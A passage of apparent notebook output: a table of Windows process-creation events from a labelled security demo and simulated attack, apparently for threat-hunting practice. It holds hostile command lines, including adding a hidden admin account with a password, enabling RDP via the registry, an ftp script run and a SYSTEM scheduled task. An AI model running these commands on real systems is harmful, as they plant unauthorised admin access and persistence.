  <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators qf938$ /add</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>668</th>\n      <td>C:\\W!ndows\\System32\\reg.exe</td>\n      <td>reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DW...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>669</th>\n      <td>C:\\Windows\\System32\\schtasks.exe</td>\n      <td>schtasks.exe  /create /tn  /tr \"c:\\pagefile.exe /?\" /sc hour /mo 1 /ru \"system\" /f</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>670</th>\n      <td>C:\\Windows\\System32\\PING.EXE</td>\n      <td>ping  127.0.0.1 -n 100</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>691</th>\n      <td>C:\\Windows\\System32\\notepad.exe</td>\n      <td>\"C:\\Windows\\System32\\NOTEPAD.EXE\" C:\\Diagnostics\\SimulateAttack.cmd</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>752</th>\n      <td>C:\\Windows\\System32\\taskhostw.exe</td>\n      <td>taskhostw.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>801</th>\n      <td>C:\\Windows\\System32\\control.exe</td>\n      <td>\"C:\\Windows\\system32\\control.exe\" /name Microsoft.DeviceManager</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>802</th>\n      <td>C:\\Windows\\SysWOW64\\dllhost.exe</td>\n      <td>C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>803</th>\n      <td>C:\\Windows\\System32\\mmc.exe</td>\n      <td>\"C:\\Windows\\system32\\mmc.exe\" C:\\Windows\\system32\\devmgmt.msc</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>810</th>\n      <td>C:\\Windows\\System32\\control.exe</td>\n      <td>\"C:\\Windows\\system32\\control.exe\" /name Microsoft.System</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>812</th>\n      <td>C:\\Windows\\explorer.exe</td>\n      <td>C:\\Windows\\explorer.exe /factory,{ceff45ee-c862-41de-aee2-a022c81eda92} -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>844</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>848</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>849</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>852</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>857</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>858</th>\n      <td>C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe</td>\n      <td>\"C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>859</th>\n      <td>C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe</td>\n      <td>\"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>860</th>\n      <td>C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe</td>\n      <td>\"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>861</th>\n      <td>C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe</td>\n      <td>\"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>862</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>865</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>866</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>1036</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1038</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=gpu-process --field-trial-h...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1039</th>\n      <td>C:\\Windows\\System32\\NETSTAT.EXE</td>\n      <td>netstat  -an</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1040</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1041</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1042</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer --field-trial-hand...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1043</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1044</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1045</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1046</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1047</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1048</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1049</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1050</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1051</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1052</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1053</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1054</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1061</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1315</th>\n      <td>C:\\Windows\\System32\\mstsc.exe</td>\n      <td>\"C:\\Windows\\system32\\mstsc.exe\"</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1316</th>\n      <td>C:\\Windows\\System32\\backgroundTaskHost.exe</td>\n      <td>\"C:\\Windows\\system32\\backgroundTaskHost.exe\" -ServerName:CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0...</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1333</th>\n      <td>C:\\Windows\\System32\\PING.EXE</td>\n      <td>ping  microsoft.com</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1433</th>\n      <td>C:\\Windows\\System32\\InstallAgent.exe</td>\n      <td>C:\\Windows\\System32\\InstallAgent.exe -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1458</th>\n      <td>C:\\Windows\\System32\\dllhost.exe</td>\n      <td>C:\\Windows\\system32\\DllHost.exe /Processid:{DC4537C3-CA73-4AC7-9E1D-B2CE27C3A7A6}</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1459</th>\n      <td>C:\\Windows\\System32\\dllhost.exe</td>\n      <td>C:\\Windows\\system32\\DllHost.exe /Processid:{49F6E667-6658-4BD1-9DE9-6AF87F9FAF85}</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1462</th>\n      <td>C:\\Windows\\System32\\mmc.exe</td>\n      <td>\"C:\\Windows\\system32\\mmc.exe\" \"C:\\Windows\\system32\\taskschd.msc\" /s</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1648</th>\n      <td>C:\\Windows\\System32\\ie4uinit.exe</td>\n      <td>C:\\Windows\\System32\\ie4uinit.exe -ClearIconCache</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1650</th>\n      <td>C:\\Windows\\System32\\unregmp2.exe</td>\n      <td>\"C:\\Windows\\System32\\unregmp2.exe\" /FirstLogon</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1654</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>C:\\Windows\\system32\\RunDll32.exe C:\\Windows\\system32\\migration\\WininetPlugin.dll,MigrateCacheFor...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1655</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.109\\Installer\\chrmstp.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.109\\Installer\\chrmstp.exe\" --configu...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1657</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenAdmin</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1658</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\Windows\\System32\\iesetup.dll\",IEHardenUser</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1659</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1661</th>\n      <td>C:\\Windows\\System32\\ServerManager.exe</td>\n      <td>\"C:\\Windows\\system32\\ServerManager.exe\"</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1665</th>\n      <td>C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe</td>\n      <td>\"C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe\" -ServerName:Ap...</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1667</th>\n      <td>C:\\Windows\\System32\\RuntimeBroker.exe</td>\n      <td>C:\\Windows\\System32\\RuntimeBroker.exe -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1668</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1669</th>\n      <td>C:\\Windows\\System32\\sihost.exe</td>\n      <td>sihost.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1671</th>\n      <td>C:\\Windows\\System32\\taskhostw.exe</td>\n      <td>taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1674</th>\n      <td>C:\\Windows\\System32\\ServerManagerLauncher.exe</td>\n      <td>C:\\Windows\\system32\\ServerManagerLauncher.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1675</th>\n      <td>C:\\Windows\\System32\\userinit.exe</td>\n      <td>C:\\Windows\\system32\\userinit.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1677</th>\n      <td>C:\\Windows\\explorer.exe</td>\n      <td>C:\\Windows\\Explorer.EXE</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1683</th>\n      <td>C:\\Windows\\System32\\ie4uinit.exe</td>\n      <td>\"C:\\Windows\\System32\\ie4uinit.exe\" -UserConfig</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1684</th>\n      <td>C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe</td>\n      <td>\"C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe\" -ServerName:Cortana...</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1688</th>\n      <td>C:\\Windows\\System32\\SettingSyncHost.exe</td>\n      <td>C:\\Windows\\system32\\SettingSyncHost.exe -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1689</th>\n      <td>C:\\Windows\\System32\\fsquirt.exe</td>\n      <td>\"C:\\Windows\\System32\\fsquirt.exe\" -Register</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1692</th>\n      <td>C:\\Windows\\System32\\mobsync.exe</td>\n      <td>C:\\Windows\\System32\\mobsync.exe -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1693</th>\n      <td>C:\\Windows\\System32\\rundll32.exe</td>\n      <td>C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa4...</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>1694</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>\"cmd.exe\" /s /k pushd \"C:\\Diagnostics\"</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>1695</th>\n      <td>C:\\Windows\\System32\\conhost.exe</td>\n      <td>\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1</td>\n      <td>0x0</td>\n    </tr>\n  </tbody>\n</table>\n<p>154 rows × 3 columns</p>\n</div>",
          "text/plain": "                                                                                           NewProcessName  \\\n282                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n358                                                                     C:\\Windows\\System32\\taskhostw.exe   \n440                                                   C:\\Windows\\System32\\AppHostRegistrationVerifier.exe   \n454                                                                           C:\\Windows\\System32\\net.exe   \n455                                                                          C:\\Windows\\System32\\net1.exe   \n456                                                                           C:\\Windows\\System32\\net.exe   \n457                                                                          C:\\Windows\\System32\\net1.exe   \n458                                                                           C:\\Windows\\System32\\cmd.exe   \n469                                                                       C:\\Windows\\System32\\TSTheme.exe   \n644                                                                       C:\\Windows\\System32\\rdpclip.exe   \n645                                                                      C:\\Windows\\System32\\AtBroker.exe   \n650                                                                           C:\\Windows\\System32\\cmd.exe   \n651                                                                           C:\\Windows\\System32\\cmd.exe   \n652                                                                           C:\\Windows\\System32\\ftp.exe   \n653                                                                         C:\\W!ndows\\System32\\cacls.exe   \n654                                                                           C:\\Windows\\System32\\net.exe   \n655                                                                       C:\\Windows\\System32\\findstr.exe   \n656                                                                          C:\\Windows\\System32\\net1.exe   \n657                                                                           C:\\Windows\\System32\\net.exe   \n658                                                                          C:\\Windows\\System32\\net1.exe   \n659                                                                           C:\\Windows\\System32\\net.exe   \n660                                                                          C:\\Windows\\System32\\net1.exe   \n661                                                                           C:\\Windows\\System32\\net.exe   \n662                                                                          C:\\Windows\\System32\\net1.exe   \n663                                                                           C:\\Windows\\System32\\net.exe   \n665                                                                          C:\\Windows\\System32\\net1.exe   \n666                                                                           C:\\Windows\\System32\\net.exe   \n667                                                                          C:\\Windows\\System32\\net1.exe   \n668                                                                           C:\\W!ndows\\System32\\reg.exe   \n669                                                                      C:\\Windows\\System32\\schtasks.exe   \n670                                                                          C:\\Windows\\System32\\PING.EXE   \n691                                                                       C:\\Windows\\System32\\notepad.exe   \n752                                                                     C:\\Windows\\System32\\taskhostw.exe   \n801                                                                       C:\\Windows\\System32\\control.exe   \n802                                                                       C:\\Windows\\SysWOW64\\dllhost.exe   \n803                                                                           C:\\Windows\\System32\\mmc.exe   \n810                                                                       C:\\Windows\\System32\\control.exe   \n812                                                                               C:\\Windows\\explorer.exe   \n844                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n848                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n849                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n852                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n857                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n858   C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe   \n859   C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe   \n860   C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe   \n861   C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool.exe   \n862                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n865                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n866                                           C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n...                                                                                                   ...   \n1036                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1038                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1039                                                                      C:\\Windows\\System32\\NETSTAT.EXE   \n1040                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1041                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1042                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1043                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1044                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1045                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1046                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1047                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1048                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1049                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1050                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1051                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1052                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1053                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1054                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1061                                          C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe   \n1315                                                                        C:\\Windows\\System32\\mstsc.exe   \n1316                                                           C:\\Windows\\System32\\backgroundTaskHost.exe   \n1333                                                                         C:\\Windows\\System32\\PING.EXE   \n1433                                                                 C:\\Windows\\System32\\InstallAgent.exe   \n1458                                                                      C:\\Windows\\System32\\dllhost.exe   \n1459                                                                      C:\\Windows\\System32\\dllhost.exe   \n1462                                                                          C:\\Windows\\System32\\mmc.exe   \n1648                                                                     C:\\Windows\\System32\\ie4uinit.exe   \n1650                                                                     C:\\Windows\\System32\\unregmp2.exe   \n1654                                                                     C:\\Windows\\System32\\rundll32.exe   \n1655                 C:\\Program Files (x86)\\Google\\Chrome\\Application\\72.0.3626.109\\Installer\\chrmstp.exe   \n1657                                                                     C:\\Windows\\System32\\rundll32.exe   \n1658                                                                     C:\\Windows\\System32\\rundll32.exe   \n1659                                                                     C:\\Windows\\System32\\rundll32.exe   \n1661                                                                C:\\Windows\\System32\\ServerManager.exe   \n1665                      C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe   \n1667                                                                C:\\Windows\\System32\\RuntimeBroker.exe   \n1668                                                                      C:\\Windows\\System32\\svchost.exe   \n1669                                                                       C:\\Windows\\System32\\sihost.exe   \n1671                                                                    C:\\Windows\\System32\\taskhostw.exe   \n1674                                                        C:\\Windows\\System32\\ServerManagerLauncher.exe   \n1675                                                                     C:\\Windows\\System32\\userinit.exe   \n1677                                                                              C:\\Windows\\explorer.exe   \n1683                                                                     C:\\Windows\\System32\\ie4uinit.exe   \n1684                           C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe   \n1688                                                              C:\\Windows\\System32\\SettingSyncHost.exe   \n1689                                                                      C:\\Windows\\System32\\fsquirt.exe   \n1692                                                                      C:\\Windows\\System32\\mobsync.exe   \n1693                                                                     C:\\Windows\\System32\\rundll32.exe   \n1694                                                                          C:\\Windows\\System32\\cmd.exe   \n1695                                                                      C:\\Windows\\System32\\conhost.exe   \n\n                                                                                              CommandLine  \\\n282   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n358                                                                                    taskhostw.exe USER   \n440                                                   C:\\Windows\\system32\\AppHostRegistrationVerifier.exe   \n454                                                          net  localgroup administrators abai$ /delete   \n455                                     C:\\Windows\\system32\\net1  localgroup administrators abai$ /delete   \n456                                                                              net  user qf938$ /delete   \n457                                                         C:\\Windows\\system32\\net1  user qf938$ /delete   \n458                                                                  cmd  /c echo End Security Demo tasks   \n469                                                            C:\\Windows\\system32\\TSTheme.exe -Embedding   \n644                                                                                               rdpclip   \n645                                                                                          atbroker.exe   \n650                cmd  /c echo Any questions about the commands executed here then please contact one of   \n651                         cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com   \n652                                                                                      ftp  -s:MG06.dll   \n653                                          cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F   \n654                                                                                           net  users    \n655                                                                                     findstr  \"qf938$\"   \n656                                                                      C:\\Windows\\system32\\net1  users    \n657                                                                    net  user qf938$ Wf9k44_9d[=$ /add   \n658                                               C:\\Windows\\system32\\net1  user qf938$ Wf9k44_9d[=$ /add   \n659                                                                         net  user qf938$ Wf9k44_9d[=$   \n660                                                    C:\\Windows\\system32\\net1  user qf938$ Wf9k44_9d[=$   \n661                                                                          net  user qf938$ /active:yes   \n662                                                     C:\\Windows\\system32\\net1  user qf938$ /active:yes   \n663                                                                       net  localgroup administrators    \n665                                                  C:\\Windows\\system32\\net1  localgroup administrators    \n666                                                            net  localgroup administrators qf938$ /add   \n667                                       C:\\Windows\\system32\\net1  localgroup administrators qf938$ /add   \n668   reg  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DW...   \n669                    schtasks.exe  /create /tn  /tr \"c:\\pagefile.exe /?\" /sc hour /mo 1 /ru \"system\" /f   \n670                                                                               ping  127.0.0.1 -n 100    \n691                                   \"C:\\Windows\\System32\\NOTEPAD.EXE\" C:\\Diagnostics\\SimulateAttack.cmd   \n752                                                                                         taskhostw.exe   \n801                                       \"C:\\Windows\\system32\\control.exe\" /name Microsoft.DeviceManager   \n802                     C:\\Windows\\SysWOW64\\DllHost.exe /Processid:{06622D85-6856-4460-8DE1-A81921B41C4B}   \n803                                         \"C:\\Windows\\system32\\mmc.exe\" C:\\Windows\\system32\\devmgmt.msc   \n810                                              \"C:\\Windows\\system32\\control.exe\" /name Microsoft.System   \n812                    C:\\Windows\\explorer.exe /factory,{ceff45ee-c862-41de-aee2-a022c81eda92} -Embedding   \n844   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n848   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n849   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n852   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n857   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n858   \"C:\\Users\\ian\\AppData\\Local\\Google\\Chrome\\User Data\\SwReporter\\38.190.200\\software_reporter_tool...   \n859   \"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...   \n860   \"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...   \n861   \"c:\\users\\ian\\appdata\\local\\google\\chrome\\user data\\swreporter\\38.190.200\\software_reporter_tool...   \n862   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n865   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...   \n866   \"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" 